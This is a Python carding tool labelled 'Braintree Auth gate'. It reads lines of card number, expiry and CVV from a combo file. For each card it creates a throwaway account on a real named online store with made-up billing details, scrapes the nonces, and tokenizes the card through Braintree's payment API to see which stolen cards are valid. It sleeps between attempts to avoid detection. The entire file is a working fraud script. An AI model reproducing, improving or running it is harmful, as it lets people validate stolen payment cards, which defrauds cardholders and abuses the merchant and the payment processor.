import pyfiglet
import user_agent
import time
import requests
import re
import base64
import random
import string
from colorama import Fore
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
user = user_agent.generate_user_agent()

# Terminal colors
Z = '\033[1;37m'
F = '\033[1;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'
W = '\033[1;37m'
E = '\033[2;34m'
R = '\033[2;31m'
Lb = '\033[1;33m'
D = '\033[2;32m'

# Banner display
banner = pyfiglet.figlet_format("Dark Universe Web", font="slant")
print(f"{C}{banner}")
print(f"{E}{'-' * 50}")
print(f"{B}Developer : HARSHU.")
print(f"{W}Gate      : Braintree Auth")
print(f"{E}{'-' * 50}\n")

# Load combo file
path = input(f"{Lb}Your Combo File Name : ")
print(f"{E}{'-' * 50}\n")

try:
    with open(path, "r") as file:
        lines = file.readlines()
        print(f"{F}[+] Loaded {len(lines)} entries from {path}")
except FileNotFoundError:
    print(f"{R}[-] File not found: {path}")
    exit()

# Start processing combos
for P in lines:
    try:
        n, mm, yy, cvc = P.strip().split('|')
    except ValueError:
        continue

    if len(mm) == 1:
        mm = f'0{mm}'
    if not yy.startswith('20'):
        yy = f'20{yy}'

    def generate_full_name():
        first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
        last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
        return random.choice(first), random.choice(last)

    def generate_address():
        cities = ["London", "Manchester"]
        streets = ["Baker St", "Oxford St"]
        zips = ["SW1A 1AA", "M1 1AE"]
        city = random.choice(cities)
        return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

    def generate_email():
        return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

    def generate_username():
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

    def generate_phone():
        return "303" + ''.join(random.choices(string.digits, k=7))

    def generate_code(length=32):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()
    corr = generate_code()

    headers = {'user-agent': user}
    session = requests.Session()

    try:
        r = session.get('https://www.bebebrands.com/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text).group(1)

        session.post('https://www.bebebrands.com/my-account/', headers=headers, data={
            'username': username, 'email': acc, 'password': 'SandeshThePapa@',
            'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
        })

        r = session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers)
        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text).group(1)

        session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data={
            'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
            'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
            'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
        })

        r = session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text).group(1)
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', r.text).group(1)

        token_resp = session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data={
            'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
        })
        enc = token_resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

        tokenize_headers = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n, 'expirationMonth': mm,
                        'expirationYear': yy, 'cvv': cvc,
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard',
        }

        r = requests.post('https://payments.braintree-api.com/graphql',
                          headers=tokenize_headers, json=json_data)
        tok = r.json()['data']['tokenizeCreditCard']['token']
        if tok:
            print(f'{n}|{mm}|{yy}|{cvc} -> Extracted Successfully ✅')
        else:
            print(f'{n}|{mm}|{yy}|{cvc} -> Extracted Failed ❌')

        time.sleep(14)

    except Exception as e:
       print(f"{R}[-] Error processing entry: {e}")